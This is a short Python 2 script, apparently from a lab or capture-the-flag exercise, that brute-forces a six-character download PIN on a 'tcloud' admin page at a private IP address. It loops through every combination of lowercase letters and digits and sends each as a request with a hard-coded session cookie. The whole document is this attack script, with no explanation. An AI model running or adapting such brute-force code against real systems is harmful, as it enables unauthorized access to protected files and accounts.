import requests
import string

url2 = "http://192.168.201.4/tcloud/admin/files/e020590f0e18cd6053d7ae0e0a507609/"
url1 = "http://192.168.201.4/tcloud/admin/?p=download&id=23&pin="
basestr = "0123456789"
basestr2 = string.ascii_lowercase
base = basestr2 + basestr
cookie = {"PHPSESSID": "c4gbc797ukr7spkc6rh914tpm5"}

for a1 in base:
	for a2 in base:
		for a3 in base:
			for a4 in base:
				for a5 in base:
					for a6 in base:
						tmp_str = a1+a2+a3+a4+a5+a6
						tmp_url = url1+tmp_str
						requests.get(tmp_url,cookies=cookie)
						print tmp_str